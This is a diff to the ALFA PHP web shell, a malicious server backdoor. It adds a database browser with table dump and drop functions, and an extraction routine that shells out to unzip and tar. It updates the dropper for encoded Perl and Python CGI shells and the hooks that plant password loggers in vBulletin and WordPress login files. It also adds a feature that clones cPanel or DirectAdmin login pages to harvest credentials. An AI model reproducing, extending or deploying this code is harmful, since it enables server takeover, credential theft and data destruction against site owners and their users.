+			$q_tables = @mysqli_query($conn, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('".implode("','", $db["databases"])."');");
+			$count = 0;
+			while($row = @mysqli_fetch_assoc($q_tables)){
+				if($sql_count){
+					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row["table_schema"].'`.`'.$row["table_name"].'`');
+					if($count_q){
+						$count = @mysqli_fetch_row($count_q);
+						$count = $count[0];
+					}
+				}
+				$tables[$row["table_schema"]][] = array("name" => $row["table_name"], "count" => (int)$count);
+			}
+			foreach($db["databases"] as $db){
+				if(!isset($tables[$db])){
+					$tables[$db] = null;
+				}
+			}
+			echo @json_encode($tables);
+		}elseif($type == "dump_drop"){
+			if($db["mode"] == "drop"){
+				foreach ($db["tables"] as $table) {
+					@mysqli_query($conn, "DROP TABLE `".$table."`;");
+				}
+				$tables = array();
+				$q_tables = @mysqli_query($conn, "SHOW TABLES;");
+				$count = 0;
+				while($row = @mysqli_fetch_array($q_tables)){
+					if($sql_count){
+						$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
+						if($count_q){
+							$count = @mysqli_fetch_row($count_q);
+							$count = $count[0];
+						}
+					}
+					$tables[] = array("name" => $row[0], "count" => (int)$count);
+				}
+				echo @json_encode($tables);
+			}else{
+				if(strlen(alfaEx("mysqldump"))>0){
+					alfaEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
+				}else{
+					$fp = @fopen($db["dump_file"], "w");
+					foreach ($db["tables"] as $table) {
+						$res = @mysqli_query($conn, 'SHOW CREATE TABLE `'.$table.'`');
+						$create = @mysqli_fetch_array($res);
+						$sql = "DROP TABLE IF EXISTS `".$table."`;\n" . $create[1].";\n";
+						if($fp) fwrite($fp, $sql); else echo($sql);
+						$tbl_data = @mysqli_query($conn, 'SELECT * FROM `'.$table.'`');
+						$head = true;
+						while($item = @mysqli_fetch_assoc($tbl_data)){
+							$columns = array();
+							foreach($item as $k=>$v) {
+							if($v == null)
+							$item[$k] = "''";
+							elseif(is_numeric($v))
+							$item[$k] = $v;
+							else
+							$item[$k] = "'".@mysqli_real_escape_string($conn, $v)."'";
+							$columns[] = "`".$k."`";
+							}
+							if($head) {
+							$sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
+							$head = false;
+							} else
+							$sql = "\n\t,(".implode(", ", $item).')';
+							if($fp) fwrite($fp, $sql); else echo($sql);
+						}
+						if(!$head)
+							if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
+					}
+				}
+				echo @json_encode(array("status" => true, "file" => $db["dump_file"]));
+			}
+		}elseif($type == "load_tables"){
+			$tables = array();
+			$q_tables = @mysqli_query($conn, "SHOW TABLES;");
+			$count = 0;
+			while($row = @mysqli_fetch_array($q_tables)){
+				if($sql_count){
+					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
+					if($count_q){
+						$count = @mysqli_fetch_row($count_q);
+						$count = $count[0];
+					}
+				}
+				$tables[] = array("name" => $row[0], "count" => (int)$count);
+			}
+			echo @json_encode($tables);
+		}elseif($type == "alter"){
+			$db["alter"]["type"] = strtolower($db["alter"]["type"]);
+			$inputs = $db["alter"]["type"]."(".$db["alter"]["input"].")";
+			$text_input = array("longtext", "text", "mediumtext", "tinytext");
+			if(in_array($db["alter"]["type"], $text_input)){
+				$inputs = $db["alter"]["type"];
+			}
+			@mysqli_query($conn, "ALTER TABLE `".$db["table"]."` MODIFY COLUMN `".$db["column"]."` " . $inputs);
+			$error = @mysqli_error($conn);
+			if($error){
+				echo $error;
+			}else{
+				echo "ok";
+			}
+		}elseif($type == "edit" || $type == "delete" || $type == "delete_all"){
+			if($type == "edit"){
+				$q = @mysqli_query($conn, "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` = '".addslashes($db["key"])."' LIMIT 0,1");
+				$row = @mysqli_fetch_assoc($q);
+				if($row){
+					$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPE as type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
+					$columns = array();
+					$edit_data = array();
+					while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
+						$input = array("col_type" => $row2["COLUMN_TYPE"]);
+						$row2["type"] = strtolower($row2["type"]);
+						switch($row2["type"]){
+							case "longtext": case "text": case "mediumtext": case "tinytext":
+								$input["tag"] = "textarea";
+							break;
+							case "int": case "smallint": case "bigint": case "tinyint": case "mediumint":
+								$input["tag"] = "input";
+								$input["type"] = "number";
+							break;
+							default:
+								$input["tag"] = "input";
+								$input["type"] = "text";
+						}
+						$columns[$row2["name"]] = $input;
+					}
+					foreach($row as $key => $v){
+						$edit_data[] = array("col" => $key, "value" => htmlspecialchars($v, ENT_QUOTES, 'UTF-8'), "type" => $columns[$key]);
+					}
+					echo @json_encode($edit_data);
+				}
+			}else{
+				if($type == "delete_all"){
+					$rows = implode("', '", $db["rows"]);
+				}else{
+					$rows = addslashes($db["key"]);
+				}
+				$query = "DELETE FROM `".$db["db"]."`.`".$db["table"]."` WHERE `".$db["col_key"]."` IN ('".$rows."')";
+				@mysqli_query($conn, $query);
+				$error = @mysqli_error($conn);
+				if($error){
+				 	$status = false;
+				}else{
+				 	$status = true;
+				}
+				echo @json_encode(array("status" => $status, "error" => $error, "query" => $query));
+			}
+		}elseif($type == "update"){
+			$query = "UPDATE `".$db["db"]."`.`".$db["table"]."` SET ";
+			foreach($db["data"] as $col => $val){
+				$query .= "`".$col."` = '".mysqli_real_escape_string($conn, $val)."',";
+			}
+			$query = substr($query, 0, -1);
+		    $query .= "WHERE `".$db["col_key"]."` = '".$db["key"]."'";
+			$res = @mysqli_query($conn, $query);
+			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
+		}elseif($type == "insert"){
+			$query = "INSERT INTO `".$db["db"]."`.`".$db["table"]."` ";
+			foreach($db["data"] as $col => $val){
+				$cols .= $col . ",";
+				$vals .= "'".mysqli_real_escape_string($conn, $val)."',";
+			}
+			$cols = substr($cols, 0, -1);
+			$vals = substr($vals, 0, -1);
+			$query = $query . "(" . $cols . ")" . "VALUES(" . $vals . ")";
+			$res = @mysqli_query($conn, $query);
+			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
+		}else{
+			$pages = 0;
+			$title = false;
+			$query = "";
+			$tbl_content = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
+			$line = 0;
+			$tables = array();
+			$columns = array();
+			if($type == "load_data"){
+				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT 0,30";
+				$tbl_count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `".$db["db"]."`.`".$db["table"]."`");
+				$tbl_count = @mysqli_fetch_row($tbl_count_q);
+				$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
+				while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
+					$columns[] = $row2;
+				}
+				if($tbl_count[0] > 30){
+					$pages = ceil($tbl_count[0] / 30);
+				}
+			}elseif($type == "query"){
+				$query = $db["query"];
+			}elseif($type == "page"){
+				$db["page"] = (int)$db["page"] - 1;
+				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT ".($db["page"]*30).",30";
+			}elseif($type == "search"){
+				$search = "";
+				$search_noval = array("= ''", "!= ''", "IS NULL", "IS NOT NULL");
+				foreach($db["search"] as $col => $val){
+					$search_noval_r = in_array($val["opt"], $search_noval);
+					if(empty($val["value"]) && !$search_noval_r)continue;
+					if(strstr($val["opt"], "...") || $search_noval_r){
+						$val["opt"] = str_replace("...", $val["value"], $val["opt"]);
+						$search .= $col . " " . $val["opt"] . " AND ";
+					}else{
+						$search .= $col . " " . $val["opt"] . " '".addslashes($val["value"])."' AND ";
+					}
+				}
+				$search .= "1=1";
+				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE " . $search;
+			}
+			$q_tables = @mysqli_query($conn, $query);
+			if(!$q_tables){
+				echo @json_encode(array("status" => false, "error" => @mysqli_error($conn), "query" => $query));
+				return false;
+			}
+			$col_key = @mysqli_query($conn, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($db["db"])."' AND TABLE_NAME = '".@addslashes($db["table"])."' AND COLUMN_KEY = 'PRI'");
+			if($col_key){
+				$col_key = @mysqli_fetch_row($col_key);
+				$col_key = $col_key[0];
+				if(!empty($col_key)){
+					$tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'" 	db_target="'.$db["db"].'" onclick="alfaMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
+				}
+			}else{
+				$col_key = false;
+			}
+			while($item = @mysqli_fetch_assoc($q_tables)){
+				if(!$title){
+					$tbl_content .= '<tr style="background-color:#305b8e;">';
+					if($col_key){
+						$tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="alfaMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
+					}
+					foreach($item as $key => $value){
+						$tbl_content .= '<th>'.$key.'</th>';
+					}
+					reset($item);
+					$title=true;
+					$tbl_content .= '</tr><tr>';
+				}
+
+				if($col_key){
+					$cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="alfaMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="alfaMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
+				}
+				$tbl_content .= '<tr class="tbl_row tbl_row_l'.$line.'">'.$cacheMsg;
+				$line++;
+				foreach($item as $key => $value){
+					if($value == null){
+						$tbl_content .= '<td><i>null</i></td>';
+					}else{
+						$tbl_content .= '<td>'.nl2br(htmlspecialchars($value)).'</td>';
+				}
+				}
+				$tbl_content .= '</tr>';
+			}
+			$tbl_content .= '</table>';
+			if(!$title){
+				$tbl_content = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
+			}
+			echo @json_encode(array("status" => true, "table" => $tbl_content, "columns" => $columns, "pages" => $pages, "query" => $query));
+		}
+		@mysqli_close($conn);
+	}
 }
 function alfaselfrm(){
 if(isset($_POST['alfa1'])&&$_POST['alfa1']=='yes'){
@@ -5278,9 +5050,11 @@ echo '</p></center></div>';
 function alfacgishell(){
 alfahead();
 $div = "";
+alfaCreateParentFolder();
+@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 if(!in_array($_POST['alfa1'],array('perl','py'))){
 $div = "</div>";
-echo '<div class=header><center><p><div class="txtfont_header">| CGI Shell |</div></p><h3><a href=javascript:void(0) onclick="runcgi(\'perl\')">| Perl | </a><a href=javascript:void(0) onclick="runcgi(\'py\');">| Python | </a>';
+echo '<div class=header><center><p><div class="txtfont_header">| CGI Shell |</div></p><h3><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'perl\')">| Perl | </a><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'py\');">| Python | </a>';
 }
 if(isset($_POST['alfa1'])&&in_array($_POST['alfa1'],array('perl','py'))){
 @mkdir('cgialfa',0755);
@@ -5292,7 +5066,7 @@ $py = '#!/usr/bin/python'."\nimport zlib, base64\n".'eval(compile(zlib.decompres
 if($_POST['alfa1']=='perl'){$code = $perl;}else{$code = $py;}
 if(__write_file($name,$code)){
 @chmod($name,0755);
-echo '<iframe src="'.'cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
+echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
 }
 }
 echo $div;
@@ -5468,7 +5242,7 @@ $code = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirecto
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
-@__write_file($d.'.htaccess',$code);
+@__write_file($d . ".htaccess", $code);
 }
 function alfabasedir(){
 alfahead();
@@ -5482,8 +5256,8 @@ $basedir = @ini_get('open_basedir');
 $safe_mode = @ini_get('safe_mode');
 if(_alfa_can_runCommand(true,false)&&($basedir||$safe_mode)){
 $bash = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
-alfaWriteTocgiapi("basedir.alfa",$bash);
-$bash_users  = alfaEx("cd alfacgiapi;sh basedir.alfa ".$makepwd,false,true,true);
+$tmp_path = alfaWriteTocgiapi("basedir.alfa",$bash);
+$bash_users  = alfaEx("cd ".$tmp_path."/alfacgiapi;sh basedir.alfa ".$makepwd,false,true,true);
 $users = json_decode($bash_users, true);
 $x=count($users);
 if($x>=2){array_pop($users);--$x;}
@@ -5581,23 +5355,142 @@ alfahead();
 AlfaNum(8,9,10);
 echo '<div class=header><p><center><p><div class="txtfont_header">| Compressor |</div></p>
 <form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
-<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.htmlspecialchars($GLOBALS['cwd']).'" size="60"/>
+<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
 <div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'alfa.zip" size="60"/>
 <input type="submit" value=" " name="ziper" />
 </form></center></p>';
 if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
 $dirzip = $_POST['alfa3'];
 $zipfile = $_POST['alfa4'];
-if (class_exists('ZipArchive')&&($GLOBALS['sys']!='unix'||!_alfa_can_runCommand(true,true))){
-$code='if(!extension_loaded(\'zip\')||!file_exists($source)){return false;}$zip=new ZipArchive();if(!$zip->open($destination,ZIPARCHIVE::CREATE)){return false;}$source=str_replace(\'\\\\\',\'/\',realpath($source));if(is_dir($source)===true){$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);foreach($files as $file){$file=str_replace(\'\\\\\',\'/\',$file);if(in_array(substr($file,strrpos($file,\'/\')+1),array(\'.\',\'..\')))continue;$file=realpath($file);if(is_dir($file)===true){$zip->addEmptyDir(str_replace($source.\'/\',\'\',$file.\'/\'));}else if(is_file($file)===true){$zip->addFromString(str_replace($source.\'/\',\'\',$file),file_get_contents($file));}}}else if(is_file($source)===true){$zip->addFromString(basename($source),file_get_contents($source));}return $zip->close();';
-$newfunc = create_function('$source,$destination', $code);
-if($newfunc($dirzip, $zipfile)){
+if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
+alfaEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
+echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
+}elseif($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
+alfaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
+echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
+}elseif(class_exists('ZipArchive')){
+if(__alfaziper($dirzip, $zipfile)){
 echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font></p></center>';
 }else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
+}
+}
+echo '</div>';
+alfafooter();
+}
+function __alfaziper($source,$destination){
+	if(!extension_loaded('zip')||!file_exists($source)){
+		return false;
+	}
+	$zip=new ZipArchive();
+	if(!$zip->open($destination,ZIPARCHIVE::CREATE)){
+		return false;
+	}
+	$source=str_replace('\\','/',realpath($source));
+	if(is_dir($source)===true){
+		$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);
+		foreach($files as $file){
+			$file=str_replace('\\','/',$file);
+			if(in_array(substr($file,strrpos($file,'/')+1),array('.','..')))continue;
+			$file=realpath($file);
+			if(is_dir($file)===true){
+				$zip->addEmptyDir(str_replace($source.'/','',$file.'/'));
+			}else if(is_file($file)===true){
+				$zip->addFromString(str_replace($source.'/','',$file),file_get_contents($file));
+			}
+		}
+	}else if(is_file($source)===true){
+		$zip->addFromString(basename($source),file_get_contents($source));
+	}
+	return $zip->close();
+}
+function alfadeziper(){
+alfahead();
+AlfaNum(8,9,10);
+echo '<div class=header><p><center><p><div class="txtfont_header">| DeCompressor |</div></p>
+<form onSubmit="g(\'deziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
+<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
+<div class="txtfont">Extract To: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'" size="60"/>
+<input type="submit" value=" " name="ziper" />
+</form></center></p>';
+if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
+$dirzip = $_POST['alfa3'];
+$zipfile = $_POST['alfa4'];
+if(@!is_dir($zipfile)){
+	@mkdir($zipfile, 0777, true);
+}
+$finfo = "";
+$file_type = "";
+if(function_exists('finfo_open')){
+$finfo = @finfo_open(FILEINFO_MIME_TYPE);
+$file_type = @finfo_file($finfo, $dirzip);
+@finfo_close($finfo);
 }else{
-alfaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."' > /dev/null &");
-echo __pre().'<center><p>Please Wait For 1 minutes AND Check this -> <b><font color="green">'.$zipfile.'</font></b><br>Because We Executed The Command in The background !</p></center>';
-}}
+	if($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
+		$file_type = alfaEx('file -b --mime-type ' . $dirzip);
+	}
+}
+if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
+alfaEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
+echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
+}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_alfa_can_runCommand(true,true)&&(strlen(alfaEx('which unzip')) > 0||strlen(alfaEx('which tar')) > 0||strlen(alfaEx('which gunzip')) > 0)){
+switch ($file_type) {
+	case 'application/zip':
+		alfaEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
+	break;
+	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
+		if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
+			alfaEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
+		}else{
+			alfaEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
+		}
+	break;
+}
+echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></b></p></center>';
+}elseif(class_exists('ZipArchive')){
+	$itsok = false;
+	if(emtpy($file_type)){
+		$file_type = "application/zip";
+	}
+	switch ($file_type) {
+		case 'application/zip':
+			$zip = new ZipArchive;
+			$res = $zip->open($dirzip);
+			if ($res) {
+				$zip->extractTo($zipfile);
+				$zip->close();
+				$itsok = true;
+			}
+		break;
+		case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
+			if(strstr(basename($dirzip), ".tar.gz")){
+				$new_file = $zipfile .'/'. basename($dirzip);
+				@copy($dirzip, $new_file);
+				$new_tar = str_replace(".tar.gz", ".tar", $new_file);
+				try {
+					$p = new PharData($new_file);
+					$p->decompress();
+					$phar = new PharData($new_tar);
+					$phar->extractTo($zipfile);
+					@unlink($new_file);
+					@unlink($new_tar);
+					$itsok = true;
+				} catch (Exception $e) {
+				}
+			}else{
+				try {
+					$phar = new PharData($dirzip);
+					$phar->extractTo($zipfile);
+					$itsok = true;
+				} catch (Exception $e) {
+				}
+			}
+		break;
+	}
+if($itsok){
+echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></p></center>';
+}else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
+}
+}
 echo '</div>';
 alfafooter();
 }
@@ -5652,7 +5545,7 @@ break;
 }
 }
 function hijackvBulletin($path,$saveto){
-$code='$alfa_username = strtolower($vbulletin->GPC["vb_login_username"]);$alfa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $alfa_username . "\'");while($row = $db->fetch_array($sql_query)){if(strlen($alfa_password) > 1 AND strlen($alfa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $alfa_username . \' : \' .  $alfa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
+$code='$alfa_username = strtolower($vbulletin->GPC["vb_login_username"]);$alfa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $alfa_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($alfa_password) > 1 AND strlen($alfa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $alfa_username . \' : \' .  $alfa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
 $clearpw = 'defined(\'DISABLE_PASSWORD_CLEARING\')';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $login = $path."/login.php";
@@ -5660,10 +5553,10 @@ $class = $path."/includes/class_bootstrap.php";
 $dologin = 'do_login_redirect();';
 $evil_login = "\t".$code."\n\t".$dologin;
 $evil_class = "true";
-if(@is_file($login) AND @is_writable($login) AND @is_file($class) AND @is_writable($class)){
+if((@is_file($login) AND @is_writable($login)) || (@is_file($class) AND @is_writable($class))){
 $data_login = @file_get_contents($login);
 $data_class = @file_get_contents($class);
-if(strstr($data_login, $dologin) AND strstr($data_class, $clearpw)){
+if(strstr($data_login, $dologin) || strstr($data_class, $clearpw)){
 $login_replace = str_replace($dologin,$evil_login, $data_login);
 $class_replace = str_replace($clearpw,$evil_class, $data_class);
 @file_put_contents($login, $login_replace);
@@ -5678,14 +5571,14 @@ hijackOutput(1);
 }
 function hijackwp($path,$saveto){
 $code = '$alfa_file="{saveto_path}";$fp = fopen($alfa_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
-$redirect_wp = 'if ( !is_wp_error($user) && !$reauth ) {';
+$redirect_wp = '#if[ ]{0,}\([ ]{0,}![ ]{0,}is_wp_error\([ ]{0,}\$user[ ]{0,}\)[ ]{0,}&&[ ]{0,}![ ]{0,}\$reauth[ ]{0,}\)[ ]{0,}{#';
 $code=str_replace('{saveto_path}',$saveto,$code);
 $login=$path."/wp-login.php";
-$evil_login = "\t".$redirect_wp."\n\t".$code;
 if(@is_file($login) AND @is_writable($login)){
 $data_login = @file_get_contents($login);
-if(strstr($data_login, $redirect_wp)){
-$login_replace = str_replace($redirect_wp,$evil_login, $data_login);
+if(@preg_match($redirect_wp, $data_login, $match)){
+$evil_login = "\t".$match[0]."\n\t".$code;
+$login_replace = @preg_replace($redirect_wp,$evil_login, $data_login);
 @file_put_contents($login, $login_replace);
 hijackOutput(0,$saveto);
 }else{
@@ -5809,6 +5702,209 @@ $results[] = $path;
 Alfa_StrSearcher($path,$string,$ext,$e,$results);
 $results[] = $path;
 }}}}
+function alfafakepage(){
+	alfahead();
+	AlfaNum(9,10);
+	echo '<div class=header><br>
+	<center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
+	<div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
+	$cm_array = array("cpanel"=>"Cpanel","directadmin"=>"DirectAdmin");
+	foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
+	echo("</select></div>");
+	echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" placeholder="eg: https://target.com:2083 | https://target.com:2222"></div>
+	<div style="margin-bottom:6px;"><span>Fake page root: </span><input size="50" type="text" name="fake_root" value="'.$_SERVER["DOCUMENT_ROOT"].'/fake_page_root/"></div>
+	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Inject to: </span><input size="50" type="text" name="inject_to" value="'.$_SERVER["DOCUMENT_ROOT"].'/index.php"></div>
+	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Bind on: </span><input size="50" type="text" name="bind_on" placeholder="eg: '.$_SERVER["DOCUMENT_ROOT"].'/wp-login.php"></div>
+	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="'.$GLOBALS['cwd'].'logs.txt"></div>
+	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
+	<div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
+	$clone_page = $_POST['alfa1'];
+	$fake_root = $_POST['alfa2'];
+	$logto = $_POST['alfa4'];
+	$panel = $_POST['alfa5'];
+	$inject_to = $_POST['alfa6'];
+	$bind_on = $_POST['alfa7'];
+	$count = $_POST['alfa8'];
+	if(!empty($clone_page) && !empty($fake_root) && !empty($logto) && !empty($inject_to) && !empty($bind_on) && $_POST['alfa3'] == '>>'){
+		echo __pre();
+		$target = $clone_page;
+		$curl = new AlfaCURL();
+		$source_page = $curl->Send($target);
+		if(!empty($source_page)){
+			$matched_form = "";
+			if($panel == "cpanel"){
+				if(preg_match('#<form(.*)id="login_form"(.*)>#', $source_page, $match)){
+					$matched_form = $match[0];
+				}
+			}else{
+				if(preg_match('#<form(.*?)>#', $source_page, $match)){
+					$matched_form = $match[0];
+				}
+			}
+			if(!empty($matched_form)){
+				$fake = "";
+				$pwd = str_replace($_SERVER["DOCUMENT_ROOT"], '', $fake_root);
+				$uri = str_replace($_SERVER["DOCUMENT_ROOT"], '', $inject_to);
+				if($panel == "cpanel"){
+					$port = "2083";
+				}else{
+					$target = str_replace(array("http://", "https://"), "", $target);
+					$port = explode(":",$target);
+					$port = $port[1];
+				}
+				if(substr($uri, 0, 1) == "/"){
+					$uri = substr($uri, 1);
+				}
+				$uri = $_SERVER["HTTP_ORIGIN"] . '/' . str_replace("index.php", "", $uri) . '?:' . $port;
+				$log_url = $_SERVER["HTTP_ORIGIN"] . $pwd . '/log.php';
+				if($panel == "cpanel"){
+					$form = '<form novalidate id="login_form" action="'.$log_url.'" method="post" target="_top" style="visibility:">';
+				}else{
+					$form = '<form action="'.$log_url.'" method="post">';
+				}
